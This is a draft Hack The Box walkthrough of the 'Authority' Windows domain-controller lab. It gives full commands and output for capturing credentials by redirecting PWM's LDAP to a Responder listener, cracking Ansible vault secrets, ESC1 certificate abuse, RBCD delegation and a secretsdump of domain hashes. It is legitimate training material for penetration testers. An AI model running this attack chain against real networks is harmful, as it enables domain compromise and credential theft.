---
title: "Authority Walkthrough(Hack-The-Box)"
date: 2025-04-12
draft: true
description: "a description"
tags: ["Medium", "Windows", "Hack The Box", "Hacking", "Active Directory", "Walkthrough"]
---
## Reconnaissance & Enumeration
- Nmap scan results:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-25 22:20:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-25T22:21:44+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-25T22:21:43+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
|_ssl-date: 2025-02-25T22:21:44+00:00; +4h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-25T22:21:43+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
|_SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-23T21:52:41
| Not valid after:  2027-02-26T09:31:05
| MD5:   b868:a55f:07a5:a28f:a9cf:531a:b659:030e
|_SHA-1: 36eb:3698:6e33:81d2:ae0a:19a6:7c00:a393:08d7:d0ad
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
62964/tcp open  msrpc         Microsoft Windows RPC
62978/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/25%OT=53%CT=1%CU=40816%PV=Y%DS=2%DC=T%G=Y%TM=67BE0A3
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=1%ISR
OS:=10D%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=107%GCD=2%ISR=108%TI=I%CI=I%II=I%SS
OS:=S%TS=U)SEQ(SP=FF%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M53CNW8N
OS:NS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)WIN(W
OS:1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%
OS:O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD
OS:=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%
OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2025-02-25T22:21:30
|_  start_date: N/A

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   298.20 ms 10.10.14.1
2   298.37 ms 10.10.11.222

```
- There is a web service running on port 80 which had default ISS page, I fuzzed it and found nothing.
- I used gobuster for this fuzzing
```
gobuster dir -u http://authority.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 60
```
![Pasted image 20250226001739.png]()
- I tried null login and anonymous for smb and got `Access denied` errors
![Pasted image 20250226001846.png]()
- There is another http service is running on port `8443` , https to be precise.
- This web port had [PWM](https://github.com/pwm-project/pwm) service running with in it. [PWM](https://github.com/pwm-project/pwm) is an open source password self-service application for LDAP directories.
- On opening the service I got this message prompt. Which as it mentioned now it's in configuration mode which I can make it useful
- 
![Pasted image 20250226000848.png]()
- After clicking I can see this login  page 
![Pasted image 20250226002653.png]()
- On clicking `Configuration Manager` I can see some sensitive information
![Pasted image 20250226002807.png]()
- Now that I identified a user named `svc_pwm`, I can try 'em with smb
- I got a hit and it seems that I can access  shares
![Pasted image 20250226002953.png]()
- So I fired up module `spider_plus` onto the shares
```
{
  "Development": {
    "Automation/Ansible/ADCS/.ansible-lint": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "259 B"
    },
    "Automation/Ansible/ADCS/.yamllint": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "205 B"
    },
    "Automation/Ansible/ADCS/LICENSE": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "11.1 KB"
    },
    "Automation/Ansible/ADCS/README.md": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "7.11 KB"
    },
    "Automation/Ansible/ADCS/SECURITY.md": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "924 B"
    },
    "Automation/Ansible/ADCS/defaults/main.yml": {
      "atime_epoch": "2023-04-24 04:20:28",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-04-24 04:20:28",
      "size": "1.54 KB"
    },
    "Automation/Ansible/ADCS/meta/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-04-24 04:20:36",
      "size": "549 B"
    },
    "Automation/Ansible/ADCS/meta/preferences.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-04-24 04:20:33",
      "size": "22 B"
    },
    "Automation/Ansible/ADCS/molecule/default/converge.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "106 B"
    },
    "Automation/Ansible/ADCS/molecule/default/molecule.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "526 B"
    },
    "Automation/Ansible/ADCS/molecule/default/prepare.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "371 B"
    },
    "Automation/Ansible/ADCS/requirements.txt": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "466 B"
    },
    "Automation/Ansible/ADCS/requirements.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "264 B"
    },
    "Automation/Ansible/ADCS/tasks/assert.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "2.87 KB"
    },
    "Automation/Ansible/ADCS/tasks/generate_ca_certs.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-04-24 04:20:56",
      "size": "2.21 KB"
    },
    "Automation/Ansible/ADCS/tasks/init_ca.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "1.21 KB"
    },
    "Automation/Ansible/ADCS/tasks/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-04-24 04:20:44",
      "size": "1.33 KB"
    },
    "Automation/Ansible/ADCS/tasks/requests.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "4.12 KB"
    },
    "Automation/Ansible/ADCS/templates/extensions.cnf.j2": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "1.62 KB"
    },
    "Automation/Ansible/ADCS/templates/openssl.cnf.j2": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "11.03 KB"
    },
    "Automation/Ansible/ADCS/tox.ini": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "419 B"
    },
    "Automation/Ansible/ADCS/vars/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "2.1 KB"
    },
    "Automation/Ansible/LDAP/.bin/clean_vault": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "677 B"
    },
    "Automation/Ansible/LDAP/.bin/diff_vault": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "357 B"
    },
    "Automation/Ansible/LDAP/.bin/smudge_vault": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "768 B"
    },
    "Automation/Ansible/LDAP/.travis.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "1.38 KB"
    },
    "Automation/Ansible/LDAP/README.md": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "5.63 KB"
    },
    "Automation/Ansible/LDAP/TODO.md": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "119 B"
    },
    "Automation/Ansible/LDAP/Vagrantfile": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "640 B"
    },
    "Automation/Ansible/LDAP/defaults/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-04-24 04:21:08",
      "size": "1.02 KB"
    },
    "Automation/Ansible/LDAP/files/pam_mkhomedir": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "170 B"
    },
    "Automation/Ansible/LDAP/handlers/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "277 B"
    },
    "Automation/Ansible/LDAP/meta/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "416 B"
    },
    "Automation/Ansible/LDAP/tasks/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "5.11 KB"
    },
    "Automation/Ansible/LDAP/templates/ldap_sudo_groups.j2": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "131 B"
    },
    "Automation/Ansible/LDAP/templates/ldap_sudo_users.j2": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "106 B"
    },
    "Automation/Ansible/LDAP/templates/sssd.conf.j2": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "2.5 KB"
    },
    "Automation/Ansible/LDAP/templates/sudo_group.j2": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "30 B"
    },
    "Automation/Ansible/LDAP/vars/debian.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "174 B"
    },
    "Automation/Ansible/LDAP/vars/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "75 B"
    },
    "Automation/Ansible/LDAP/vars/redhat.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "222 B"
    },
    "Automation/Ansible/LDAP/vars/ubuntu-14.04.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "203 B"
    },
    "Automation/Ansible/PWM/README.md": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "1.26 KB"
    },
    "Automation/Ansible/PWM/ansible.cfg": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "491 B"
    },
    "Automation/Ansible/PWM/ansible_inventory": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "174 B"
    },
    "Automation/Ansible/PWM/defaults/main.yml": {
      "atime_epoch": "2023-04-24 04:21:38",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-04-24 04:21:38",
      "size": "1.55 KB"
    },
    "Automation/Ansible/PWM/handlers/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "4 B"
    },
    "Automation/Ansible/PWM/meta/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "199 B"
    },
    "Automation/Ansible/PWM/tasks/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "1.79 KB"
    },
    "Automation/Ansible/PWM/templates/context.xml.j2": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "422 B"
    },
    "Automation/Ansible/PWM/templates/tomcat-users.xml.j2": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "388 B"
    },
    "Automation/Ansible/SHARE/tasks/main.yml": {
      "atime_epoch": "2023-03-17 18:50:48",
      "ctime_epoch": "2023-03-17 18:50:48",
      "mtime_epoch": "2023-03-17 19:07:52",
      "size": "1.83 KB"
    }
  }
}

```
- Searched the files and folders for hours and found some password in the file `ansible_inventory`
```
ansible_user: administrator
ansible_password: <SNIP>
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```
- Also within `PWM/defaults/main.yml` found some `ansible` keys or values.
```
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          <SNIP>

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          <SNIP>

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          <SNIP>
```
- JohnTheRipper has a script to make hashes out of these values. Which is pretty handy.
- Stored all the three hashes in three different files and fed it to `ansible2john` and stored the returned hashes to a file
![Pasted image 20250226010520.png]()
- I was able to crack all three hashes, However all three turns out to be same value
![Pasted image 20250226010745.png]()
- Now that I got the password it's time for me to decrypt the key or values we got earlier 
- Using pipx downloaded `ansible`
```
pipx install ansible-core
```
- Decrypted and got passwords from the three keys or values using the cracked password
![Pasted image 20250226012218.png]()
- On trying to login as `svc_pwm` with one of the password I got a error
![Pasted image 20250226012435.png]()
## Exploitation
- But the password worked on `Configuration Manager`
- I can see the appropriate domain name and some info on ldaps
![Pasted image 20250226013045.png]()
- From `Configuration Editor` I learnt about a new user `svc_ldap`
![Pasted image 20250226013359.png]()
- Also LDAP proxy password is hidden and cannot be viewed by this GUI. In theory on changing the ldap url with my ip and the protocol to `ldap` I can get the password
- Changed the`LDAP URLs` to  `ldap://10.10.14.16:389`
![Pasted image 20250226014717.png]()
- On other side opened Responder
```
sudo responder -I tun0
```
- Got the password 
![Pasted image 20250226014855.png]()
- This password works for the user `svc_ldap` and the user has both `smb` and `winrm` permission.
- Got the user flag
![Pasted image 20250226015623.png]()
## Privilege Escalation
- When I run certipy for to enumerate ADCS, the output shows that there is a vulnerable template called `CorpVpn` . This template paves the path for us to exploit ESC1.
![Pasted image 20250226164410.png]()
- I can exploit this by adding a computer and requesting a certificate for `upn:` `administrator` 
- **Abusing ESC1:**
	- I have to enumerate for computers, The setting that allows a user to add a computer to the domain is the `ms-ds-machineaccountquota`
	- The same we have done earlier in [[2.4-Support]]  box. I can enumerate for this using `netexec` using module `maq` 
```
netexec ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
```
![Pasted image 20250226165046.png]()
- Now I can add a new computer to the dc using `addcomputer` a impacket's tool
```
addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name Emp5r0R -computer-pass 'Password123!' -dc-ip 10.10.11.222
```
![Pasted image 20250226165435.png]()
- Here I added a computer named `Emp5r0R` to the DC now I can request certificate for `administrator` as computer `Emp5r0R` 
```
certipy req -username 'Emp5r0R$' -password 'Password123!' -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
```
![Pasted image 20250226165452.png]()
- I tried to authenticate with the certificate but It failed
```
certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222
```
![Pasted image 20250226165559.png]()
- Apparently,it happens because “the DC isn’t properly set up for PKINIT and authentication will fail”
- To workaround this I can use something like `passthecert`attack but for that I need the certificate and  key separately. I can extract the same with certipy
- Getting key:
```
certipy cert -pfx administrator_authority.pfx -nocert -out admin.key
```
![Pasted image 20250226170303.png]()
- Getting Certificate:
```
certipy cert -pfx administrator_authority.pfx -nokey -out admin.crt
```
![Pasted image 20250226170337.png]()
- Now I can give `write_rbcd` permission to my computer using the certificate and key of user `administrator`
- *RBCD: RBCD allows a _service_ (running on a computer account) to impersonate users _only to specific other services_ on _other_ computers. Unlike traditional constrained delegation (which specifies _who_ can delegate _to_ a service), RBCD focuses on _which services a computer can access_ on behalf of users. The key is the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer object.*
- This tool [passthecert](wget https://raw.githubusercontent.com/AlmondOffSec/PassTheCert/refs/heads/main/Python/passthecert.py) made this attack easy for me . Using this tool I assigned RBCD permission to `Emp5r0R$`.
```
python3 passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'Emp5r0R$' -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222
```
![Pasted image 20250226214527.png]()
- Synced the time before getting TGT `sudo ntpdate authority.htb`
- Now I can impersonate the user `administrator`using my computer
```
getST.py -spn 'cifs/authority.authority.htb' -impersonate 'Administrator' 'authority.htb/Emp5r0R:Password123!'
```
![Pasted image 20250226214753.png]()
- Exported the ticket `export KRB5CCNAME=Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache`
- Now that I have TGT of user administrator I can do secretsdump
```
secretsdump.py -k -no-pass 'authority.htb/administrator@authority.authority.htb'
```
- Got the dumps successfully
```
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x31f4629800790a973f9995cec47514c6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
HTB\AUTHORITY$:plain_password_hex:e8b036d7eb1f72a49e7a0b526cffced18b1f296154c54430ee38bbfd645bcb4701c8e27227e1e1533dc7a80121cb0e7ffff17daae09853f2b55e520a1d7aa3ae793bd7abba8585fdffb3d3356e0bfe873ba033a7e4cad76413a44856823341d58030b93c7be82e678632c68b8157d57cd7e974d1c6a28aabeca17d07edb7075807aa1ede3d41b988bad04bf8d0886996387a79a2b11f62aa1560b6275b8d8da8cac88190c8e74de68a2f163809e1559247a4f25b7cc30086943dba87f86408e97a903efefb1959ed137ff054ff3555826c26daa965de247fbdd602457327c32b1612f81babd66cfc59304aff0b103308
HTB\AUTHORITY$:aad3b435b51404eeaad3b435b51404ee:a24d6c11654195abb225adbbc8dadbb1:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd5d60027f85b1132cef2cce88a52670918252114
dpapi_userkey:0x047c1e3ad8db9d688c3f1e9ea06c8f2caf002511
[*] NL$KM 
 0000   F9 41 4F E3 80 49 A5 BD  90 2D 68 32 F7 E3 8E E7   .AO..I...-h2....
 0010   7F 2D 9B 4B CE 29 B0 E6  E0 2C 59 5A AA B7 6F FF   .-.K.)...,YZ..o.
 0020   5A 4B D6 6B DB 2A FA 1E  84 09 35 35 9F 9B 2D 11   ZK.k.*....55..-.
 0030   69 4C DE 79 44 BA E1 4B  5B BC E2 77 F4 61 AE BA   iL.yD..K[..w.a..
NL$KM:f9414fe38049a5bd902d6832f7e38ee77f2d9b4bce29b0e6e02c595aaab76fff5a4bd66bdb2afa1e840935359f9b2d11694cde7944bae14b5bbce277f461aeba
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<SNIP>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:a24d6c11654195abb225adbbc8dadbb1:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
